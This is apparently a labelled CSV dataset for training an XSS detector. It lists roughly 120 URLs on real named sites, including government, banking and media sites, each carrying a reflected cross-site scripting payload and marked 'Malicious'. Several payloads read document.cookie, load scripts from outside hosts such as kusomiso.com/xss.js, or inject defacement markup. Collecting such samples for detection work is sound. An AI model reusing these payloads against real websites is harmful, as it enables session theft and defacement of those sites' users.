Payloads,Class
http://www.microsoft-press.de/catalog.asp?cnt=catalog&amp;cat0=21&amp;idx0=3&amp;lng=&quot;&gt;&lt;script&gt;alert('trex')&lt;/sc<br>ript&gt;&lt;h1&gt;turkhackeriz.com&lt;/h1&gt;,Malicious
http://www.webmasterforhire.us/port-medical/show_photo.php?photo=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/s<br>cript&gt;,Malicious
http://www.humanite.fr/recherche.html?motcles=%22%3e%3c/iframe%3e%3cscript%3ealert(%27xss%27)%3b%3c%<br>2fscript%3e&amp;date=7jours&amp;ok=ok,Malicious
http://www.dancesportbc.com/content.php?sectionid=3&amp;contentid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scri<br>pt&gt;,Malicious
"http://wwwstuff.wip3.adobe.com/events/main.jsp?productid=124&amp;solutionid=&amp;month=}&quot;&gt;&lt;script&gt;alert(stri<br>ng.fromcharcode(88,83,83))&lt;/script&gt;",Malicious
http://anzoategui.tsj.gov.ve/noticias/noticia_detallada.asp?id=%22%3e%3cscript%3ealert(/xssed/);%3c/<br>script%3e,Malicious
http://www.ttadana.telekom.gov.tr/yeni2/album/default.asp?dir=%22%3e%3cscript%3ealert(1)%3c/script%3<br>e,Malicious
http://www.totalsoft.ro/charisma-software-project-management/mainpage|displayresultspage?q=%22%3e%3c<br>script%3ealert(31337)%3c%2fscript%3e&amp;x=0&amp;y=0,Malicious
http://benq.es/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+nar<br>coticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.kcc.go.ug/city_council_of_kampala_search_results.asp?search_text=%27%22%3e%3c%2ftitle%3e%<br>3cscript%3ealert(1337)%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%<br>3e&amp;btnsubmit.x=0&amp;btnsubmit.y=0,Malicious
http://mymanuskrip.fsktm.um.edu.my/greenstone/cgi-bin/library.exe?e=status-00000-00---off-0--00---0-<br>10-0---0---0prompt-10---4-------0-1l--10-en-50---20-welcome---0--1-00-0-0-01-1-0utfzz-8-00&amp;a=status&amp;<br>p=collectioninfo&amp;pr=nullproto&amp;c=test}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.source));%3c/s<br>cript%3e%27%22%3e%3cmarquee%3e%3ch1%3ehhhhh%3c/h1%3e%3c/marquee%3e,Malicious
http://www.e-mexico.gob.mx/wb2/emex/emex_buscador_de_preguntas_frecuentes?met=buscar&amp;qry=%3e%22%3e%3<br>cscript%3ealert('norehem%20was%20here!!')%3c/script%3e%3ch1%3e%3ch1%3e%3ch1%3e%3cmarquee%3enorehem%2<br>0was%20here%3c/marquee%3e%3c/h1%3e%3c/h1%3e%3c/h1%3e%3ccenter%3e%3cimg%20src=%22http://www.cibernaut<br>ica.com/forocibernautica/upload/norehemzu4.gif%22%3e%3c/center%3e%3ciframe%20src=http://jersain.iesp<br>ana.es/xss.html%20%3c,Malicious
http://italiasalute.leonardo.it/shopping/shopcustadmin.asp?msg=%3cscript%3ealert(%22by%20s3al%20||cy<br>ber-unity.com%22)%3c/script%3e,Malicious
http://www.mak-ser.com/default.asp?sayfa=urun1&amp;kategori=&lt;script&gt;alert(&quot;scriptorium(turkey)<br>hackhaber.com&quot;)&lt;/script&gt;,Malicious
http://backup.vip2ch.com/orz/orz.cgi/-/kusomiso.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20ku<br>somiso.com%22)%3c/script%3e,Malicious
http://www.alldatasheet.co.kr/view.jsp?searchword=%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
http://secure.digitallook.com/cgi-bin/digitalcorporate/msn/company_search_lite.cgi?primary=y&amp;keyword<br>_begins=y&amp;action=search&amp;name=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&amp;submit=go,Malicious
http://www.ieepo.gob.mx/dbase.htm?num=6&amp;keys=%3e%22%3e%3cscript%20%0a%0d%3ealert(document.domain)%3b<br>%3c/script%3e&amp;x=0&amp;y=0,Malicious
http://www.century21-academy.com/hizli_arama.asp?islem_turu=''&gt;&lt;script&gt;alert('narcoticxs')&lt;/script&gt;'<br>&gt;&lt;h1&gt;hacked&lt;/h1&gt;,Malicious
http://www.tni-au.mil.id/content.asp?catid=&amp;contenttype=&amp;keywords=%27%22%3e%3c/title%3e%3cscript%3ea<br>lert(%22xss%22);%3c/script%3e%3cmarquee%20bgcolor=%22red%22%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c<br>/marquee%3e&amp;search=search&amp;do_search=1,Malicious
http://www.heso-click.com/items/?kw=%22%3e%3ciframe%20src=/%3e%3c/iframe%3e,Malicious
http://ymobileblog.com/blog/?s=+}%3c%2fstyle%3e%3cscript%3ea%3deval%3bb%3dalert%3ba%28b%28%2fxss%2f.source%29%29%3b%3c%2fscript%3e%3cmarquee+bgcolor%3d%22red%22%3e%3ch1%3exss3d+by+hari%28topsecure.net%29%3c%2fh1%3e%3c%2fmarquee%3e,Malicious
https://www.uhcindia.com/login.asp?var=%22%3e/r0hit/%3e%3cscript%3ealert%28document.cookie%29%3c/scr<br>ipt%3e%3cscript%20src=http://www.fashiongroup.com.mk/x.js%3e%3c/script%3e,Malicious
http://www.gloriamundi.org/keywords.asp?keywords=%22%3e%3cbody+onload=alert(%22by%20encore%22)%3e%3c<br>marquee%3e%3ch1%3eunutamadim%20:(%20%20%20%3c/h1%3e%3ch2%3e%20by%20encore%20%3c/h2%3e,Malicious
http://camekan.com/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.echelon.com/productdb/search.asp?strsearch=ag&amp;offset=360&quot;&gt;&lt;script&gt;alert(&quot;bluemax&quot;)&lt;/scrip<br>t&gt;,Malicious
http://www.sovrep.gov.by/index.php/main.html?sstring=%3cscript%3ealert(document.cookie);%3c/script%3<br>e%3e,Malicious
http://a.locoboard.net/delete.php?id=vip&amp;no='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c<br>/script%3e,Malicious
"http://www.brancopelle.com/x7chat/install.php?step=2%22%3e%3cscript%3ealert%28string.fromcharcode%2867,114,52,116,51,114,32,87,97,115,32,72,101,114,101%29%29%3c/script%3e",Malicious
http://www.dekrim.se/main_info.php?subject=main_info.php&amp;name=%22%3e%3cscript%3ealert(123)%3c/script<br>%3e&amp;email_1=&amp;email_2=&amp;text=&amp;x=20&amp;y=3&amp;subject=other&amp;a=contact&amp;b=contactaction,Malicious
http://www.motcom-com.ch/news.php?id=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3e%3cmarq<br>uee%3e%3ch1%3eehl-i%20beyt%3c/h1%3e%3c/marquee%3e,Malicious
http://www.integratir.com/emailalerts.asp?ticker=v.xlt&amp;lang=fr&amp;title=&lt;script&gt;alert(&quot;scriptorium(turk<br>ey)&quot;)&lt;/script&gt;,Malicious
http://www.airtightdesign.com/search/?search=1&amp;query=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&amp;submit_search.x=0&amp;<br>submit_search.y=0,Malicious
http://www.alaazzurra.com/igallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+na<br>rcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://aene.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/<br>marquee&gt;,Malicious
"http://forecast.msn.co.il/msn/israel_for.php?file=';alert(string.fromcharcode(88,83,83))//\';alert(s<br>tring.fromcharcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;alert(string.fromcharc<br>ode(88,83,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88,83,83))%3c/scri<br>pt%3e",Malicious
https://secure-espaceclient-canalplus.canal-plus.com/index.php?tpl=10&amp;ins=1&amp;intro=1%22%3e%3cscript%3<br>ealert(document.cookie)%3c/script%3e&amp;new=1%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.kennystextile.com/tr/default.asp?gb=urun&amp;id=293&amp;ortak=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script<br>&gt;,Malicious
http://www.buscadortelered.com.ar/index.php?verficha=107534&amp;template_ficha=%22%3e%3cscript%20src=htt<br>p://vuln.xssed.net/thirdparty/scripts/ckers.org.js%3e%3c/script%3e,Malicious
http://www.polenmobilya.com.tr/urunler.asp?id=18&amp;baslik=d%c4%b0%c4%9eer%20gruplar&lt;script&gt;alert(&quot;cybe<br>r_thief(turkey)%20hackhaber.com&quot;)&lt;/script&gt;,Malicious
http://www.2020software.com/search/%22%3e%3ciframe+src%3d%22http%3a%2f%2fwww.xssed.com%22%3e%3c%2fif<br>rame%3e/,Malicious
http://www.vigicrues.ecologie.gouv.fr/niv_spc.php?idspc=%22%3e'%3e%3cscript%20src=http://vuln.xssed.<br>net/thirdparty/scripts/python5.js%3e%3c/script%3e,Malicious
http://www.cid24.org/cms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backd<br>oor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.eksperten.dk/priser/soegning.asp?soeg=%22%3e%27%3e%3cscript%3ealert%28123%29%3c%2fscript%<br>3e%22%27,Malicious
http://www.ffsc.fr/recherche.php?motscles=%22%3e%3cscript%3ealert%281%29%3c/script%3e,Malicious
http://www.ciao.se/sr/q-%22%3e%27%3e%3cscript%3ealert(123)%3c/script%3e,Malicious
http://showip.net/check_user_agent.php?useragent=%22%3e%3cscript%3ealert(%2fxssed+by+dr.optix%2f)%3c<br>%2fscript%3e&amp;dosubmit=check+user+agent,Malicious
http://weightweenies.starbike.com/listings/components.php?type=%22%3e%3cscript%3ealert('seymen')%3c/<br>script%3e,Malicious
http://mediathek.daserste.de/sendungen_a-z?buchstabe=</script><script>alert(navigator.useragent)</script>,Malicious
http://find.dk/find_super/vis_alt.asp?words=%22%3e%3cstyle%3e*:after{color:magenta;text-decoration:b<br>link!important;content:%22p0wned!%22%3c/style%3e,Malicious
http://www.gelateria3bis.it/guestbook/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.bankofireland.ie/site-search/htsearch?words=%3cscript%3ealert%28%22xss%22%29%3c%2fscript%<br>3e&amp;submit=go,Malicious
https://consultants.apple.com/au/locator_results.php?sl='&quot;--&gt;&lt;/style&gt;&lt;/script&gt;&lt;script&gt;alert(document<br>.cookie)&lt;/script&gt;,Malicious
"http://www.insidefutures.com/articles/article.php?id=285337utmterm=futurescommoditiescommentaryutmco<br>ntent=relevantfuturesprices,charts,andtradingcommentaryauthoredbykeyplayersinthecommodities,forexand<br>optionsindustriesutmsource=twi%22%3e%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%<br>20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2<br>0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<br>%20%20%3cscript%20src=http://lupbot.comule.com/asu_abangjs.php%3e%3c/script%3e",Malicious
http://paris-locations-saisonnieres.fr/detail.php?id=%3cscript%3ealert%28%22virtual_system%22%29%3c/<br>script%3e.,Malicious
http://www.plusline.org/article.php?id=6068%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://vankasteren-ict.nl/view_news.php?id=%27%22%28%29%26%251%3cscript%20%3eprompt%28960682%29%3c%2<br>fscript%3e,Malicious
http://www.iict.pt/docbweb/plinkres.asp?base=isbd&amp;form=&amp;startrec=0&amp;recpag=5&amp;newsearch=1&amp;searchtxt=&quot;&gt;<br>&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://cbsncis.wetpaint.com/account/%3e%3cscript%3ealert(%22xss%20by%20azat%22)%3c%2fscript%3e,Malicious
http://badoo.com/ronfini/friend/new_request.phtml?user_id=0&amp;burl=lol://%3cscript%3ealert(document.co<br>okie);%3c/script%3e,Malicious
http://www.ktams.org/forum/philboard_search.asp?searchterms=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;&lt;h1&gt;www.raptr.us.tc&lt;/h1&gt;,Malicious
"http://www.wed168.com.tw/indservice_b/book/index.asp?sec_id=87&amp;sec_name=%e4%b8%83%e8%a6%8b%e6%ab%bb%<br>e5%a0%82%e6%89%8b%e5%b7%a5%e5%b7%a7%e5%85%8b%e5%8a%9b&amp;sec_mail=nksdchoco@yahoo.com.tw%27,%27%27,%27%<br>27,%27res%27,%2753%27,%27%27)}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.source));%3c/script%3<br>e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e",Malicious
http://www.zhangshiji.com/product.asp?bigclassname=%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
http://kr.888.com/new888/home.htm?page=gettingstarted&amp;lang=%22%3e%3cscript%3ealert(document.cookie)%<br>3c/script%3e,Malicious
http://coordinamento.mininterno.it/servpub/ver2/scar/ricerca_targa.asp?numerotarga=%22%3e%3cscript%3<br>ealert(document.cookie)%3c/script%3e&amp;numerotelaio=%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xados%20%3ch<br>1%3e%3c/marquee%3e,Malicious
http://www.arhp.org/patienteducation/interactivetools/choosing/index.cfm?id=&quot;&gt;&lt;script&gt;alert(document<br>.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://bdopen.com/themes/defeng/login.asp?folder=2326&amp;backpage=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scr<br>ipt&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.alarabiya.net/mmgallery.php?id=10&name=%22%3e%3cfont+size=55+color=red%3ehacked%20by+oxo%3c/font%3e%3cscript%3ealert%28/oxo/%29%3c/script%3e,Malicious
http://www.menashe.co.il/index.asp?id=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3e%3cmar<br>quee%3e%3ch1%3emeloulisi%3c/h1%3e%3c/marquee%3e,Malicious
"http://www.microsoft.com/download/en/search.aspx?q=t*&p=0&r=10&t=3&s=availabledate~descending'""--><script x src=//0x.lv?</style></script><script>alert(string.fromcharcode(66,101,115,116,32,114,101,103,97,114,100,115,32,102,114,111,109,32,66,117,108,103,97,114,105,97))</script><script src=http://ckers.org/xss.js>",Malicious
http://rd.or.tp/kiken_url_list/vscan/scan.php?url=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%7<br>4%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30<br>%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%<br>39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://nytimes.com/gst/litesub_insert.html?product=my&amp;size=336x90&amp;email=&quot;<br>&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;,Malicious
http://www.export.gov/searchresults/index.asp?q=%22%3e%3cscript%3ealert%281337%29%3c%2fscript%3e,Malicious
http://www.bbc.co.uk/mediaselector/check/worldservice/meta/tx/live_news?size=au&amp;bgc=003399&amp;lang=en-w<br>s&amp;nbram=1&amp;nbwm=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
"http://giochi.mobile.it.msn.com/cerca.php?search=%3cscript%3ealert(string.fromcharcode(88,83,83))%3c/script%3e",Malicious
http://www.iphoneitalia.com/?s=%3c/title%3e%3c/head%3e%3cbody%3e%3cscript%20src=%22http://googlebig.<br>com/l.js%22%3e&amp;submit.x=0&amp;submit.y=0&amp;submit=cerca,Malicious
http://fangroups.org/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://mb.softbank.jp/mb/shop/search/index.html?shopname=%27%3e%22%3e%3ciframe+src%3dhttp%3a%2f%2fku<br>somiso.com%2f&amp;x=5&amp;y=7,Malicious
http://www.hi5networks.com/cgi-bin/mt/mt-search.cgi?search=%22%3cscript%3ealert%28%22xssed%22%29%3c/<br>script%3e,Malicious
http://www.ofpra.gouv.fr/search.html?search=%3cscript%3ealert%28%2fzeryus%2f%29%3c%2fscript%3e%3cmar<br>quee%3e%3ch1%3exss+by+zeryus+%3c%2fh1%3e%3c%2fmarquee%3e,Malicious
http://www.orlandotextbooks.com/showcategory.php?type=6&amp;keyword=&quot;&gt;&lt;script&gt;alert(backdoor)&lt;/script&gt;&gt;&lt;<br>marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.golfdiscounter.eu/shopcustadmin.asp?msg=%3e'%3e%3cscript%20%0a%0d%3ealert(cyber-unity)%3b<br>%3c/script%3e%20%3cscript+src=%22http://cyber-unity.com/x55.js?,Malicious
http://www.stonebilgisayar.com.tr/default.asp?gb=urun&amp;id=293&amp;ortak=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/scri<br>pt&gt;,Malicious
http://www.rgl.wa.gov.au/m/mosaddphp/info.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%3c/script<br>%3e,Malicious
http://www.yola.com/login?login-success_url=%22%3e%3ciframe%20src=%22http://xssed.com%22%3e,Malicious
http://www.ylw.mmtr.or.jp/~jmjoy/newsboard/newsboard.cgi?num=%3e%22%3e%3cscript%3ealert%28%27ins%20-<br>%20unkn0wn.eu%27%29%3c%2fscript%3e,Malicious
http://members.sina.com/cgi-bin/nz/edit.cgi?netid=&amp;pd1=&amp;login=&amp;passwd=&amp;pass2=&amp;lastname=%22%3e%27%3e%<br>3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%2<br>8%38%38%2c%38%33%2c%38%33%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;firstname=&amp;country=united%20states&amp;reg<br>place=united%20states&amp;email1=&amp;gender=female&amp;gender=male&amp;birthplace=0&amp;birthmonth=00&amp;birthday=00&amp;birth<br>year=1900&amp;state=0&amp;city=&amp;zip=&amp;education=0&amp;jobfunction=0&amp;income=0&amp;nz_usa=checkbox&amp;nz_sex=checkbox&amp;nz_j<br>oke=checkbox&amp;nz_finance=checkbox&amp;nz_mall=checkbox&amp;nz_beauty=checkbox&amp;write=%20submit%20&amp;reset=clear&amp;<br>isreserved=&amp;lmode=,Malicious
http://ebid.nashville.gov/auction/xcapsearch.asp?cmd=search&amp;searchby=all&amp;searchfor=%22%3e%3cscript%3<br>ealert%28%22backdoor%22%29%3c%2fscript%3e&amp;catid=405,Malicious
https://www.metbank.com/search/default.asp?keywords=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/<br>script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e%27%22%3e%3c/title%3e%3csc<br>ript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e%27%<br>22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h<br>1%3e%3c/marquee%3e%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3ex<br>ss%20by%20xylitol%3c/h1%3e%3c/marquee%3e&amp;x=0&amp;y=0,Malicious
"http://www.banking.hsbc.co.in/script/in/personal/mfs/dailynav2.asp?house=franklin%20templeton%20mutu<br>al%20fund%3cscript%3ealert('agd_scorp,%20also%20has%20sql%20bug ;)')%3c/script%3e",Malicious
http://inspeak.com/index.php?app_current_action=viewmodule&app_current_module=%3cscript%3ealert%28123%29;%3c/script%3e,Malicious
http://ttongfly.net/bbs/view.php?id=free&amp;keyword=%c2%bc%c3%9b%c2%bd%c3%83&amp;no=1006&amp;sc=on&amp;sn=on&amp;ss=on%<br>22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%4<br>3%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39<br>%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%<br>69%70%74%3e%0a,Malicious
http://comptroller.nyc.gov/bureaus/audit/yearlyview.asp?sortby=%22%3e%3cscript%3ealert(document.cook<br>ie)%3c/script%3e,Malicious
http://insite.blackamericaweb.com/dwb_register/errors/index.html?ecode=31&amp;emsg=%3cscript%3ealert('nu<br>llflow');%3c/script%3e,Malicious
http://www.cmtv.com.ar/buscador/show.php?p=%22%3e%3cscript+src%3dhttp%3a%2f%2fvuln.xssed.net%2fthird<br>party%2fscripts%2fckers.org.js%3e%3c%2fscript%3e&amp;s=1&amp;imagefield.x=19&amp;imagefield.y=12,Malicious
http://adallclassifieds.com/showcategory.php?cid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;<br>&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.zdnet.fr/shopping/rechercher/?query=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.environment.gov.pk/aqi/uploadfiles/uploadform.asp?msg=%3c/%3e%3cscript%3ealert%28%22xssed<br>%20by%20angle%20a.k.a%20malwarrior%22%29;%3c/script%3e,Malicious
http://www.locumco.com.au/register.php?show=pharm&amp;tertmenu=%22;%3c/script%3e%3cscript%3ealert(docume<br>nt.cookie);&lt;/script&gt;&lt;script&gt;,Malicious
http://www.kawaii-design.com/search_products.asp?s=%3cscript%3ealert%28123%29%3c%2fscript%3e&amp;s1=on&amp;x<br>=22&amp;y=10,Malicious
http://www.k.kth.se/www/gallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narco<br>ticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.bojnourd.info/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>ackdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://at.playstation.com/search-results/?searchpattern=%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c<br>/script%3e%3ch1%3e%3cmarquee%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e&amp;submit-search=search,Malicious
http://mapserver3.ldpassociati.it/siena/portale/gloss_norm/glossario.cfm?cod_cla=2&amp;cod_sottocla=1&amp;de<br>scri_sottocla=%3e%22%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
https://ssl.chukei.co.jp/cgi-bin/mlm/mlm_confirm.rb?email=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2<br>fkusomiso%2ecom%2fxss%2ejs%3e%3c%2fscript%3e&amp;mla=1&amp;mlb=1&amp;htmlml=1&amp;submit=%8am%94f&amp;submit2=%83%8a%83z<br>%83b%83g,Malicious
"http://vagalume.uol.com.br/search.php?t=art&amp;q=&lt;/title&gt;&lt;script&gt;alert(string.fromcharcode(88,83,83,32,<br>98,121,32,66,117,103,66,117,115,116,101,114,32,45,32,76,101,105,97,32,98,117,103,98,117,115,116,101,<br>114,46,99,111,109,46,98,114));&lt;/script&gt;",Malicious
http://www.ibn-engineering.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;<br>backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.myfreewallpapers.com/search.asp?domains=www.myfreewallpapers.com%3bwww.myfreewallpapers.n<br>et&amp;q=%22%3e%3cscript%3ealert(%2fxssed+by+dr.optix%2f)%3c%2fscript%3e&amp;sa=find&amp;sitesearch=www.myfreewa<br>llpapers.com&amp;cof=forid%3a9&amp;client=pub-9516897064761360&amp;forid=1&amp;ie=iso-8859-1&amp;oe=iso-8859-1&amp;safe=acti<br>ve&amp;flav=0000&amp;sig=hbhwbeqx-lqnir1p&amp;cof=galt%3a%232058a5%3bgl%3a1%3bdiv%3a%23000000%3bvlc%3affffff%3ba<br>h%3acenter%3bbgc%3ac0c0c0%3blbgc%3a2058a5%3balc%3affffff%3blc%3affffff%3bt%3a000000%3bgfnt%3affffff%<br>3bgimp%3affffff%3bforid%3a11&amp;hl=en,Malicious
https://ert.cern.ch/browse_www/wd_map?p_web_site_id=1&amp;p_format=full&amp;p_class_type=programme&amp;p_class_v<br>alue=fellowships&amp;p_title=%22%3e%3cscript%3ealert('seymen')%3c/script%3e,Malicious
http://europa.eu/whoiswho/public/index.cfm?lang=%22%3e%3cscript%3ealert(1)%3c/script%3e%3ch1%3eccc%2<br>0was%20here%3c/h1%3e,Malicious
http://lfa.de/website/de/suche/suchergebnis/index.php?searchword=%3c%22%3c%3cscript%3ealert%28docume<br>nt.cookie%29%3c%2fscript%3e&amp;send=suche&amp;style=,Malicious
http://www.masterofmalt.co.uk/shopping/shopcustadmin.asp?msg=%3e'%3e%3cscript%20%0a%0d%3ealert(cyber<br>-unity)%3b%3c/script%3e%20%3cscript+src=%22http://cyber-unity.com/x55.js?,Malicious
http://www.birgenclikhikayesi.com/main/index.php?page_id=253&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;,Malicious
http://turhalyio.k12.tr/galeri/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcot<br>icxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://nostalji.org/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.hack-medya.org/rss/show_webfeed.php?wccategory=0&amp;wcheadlines=&lt;script&gt;alert(document.cooki<br>e)&lt;/script&gt;,Malicious
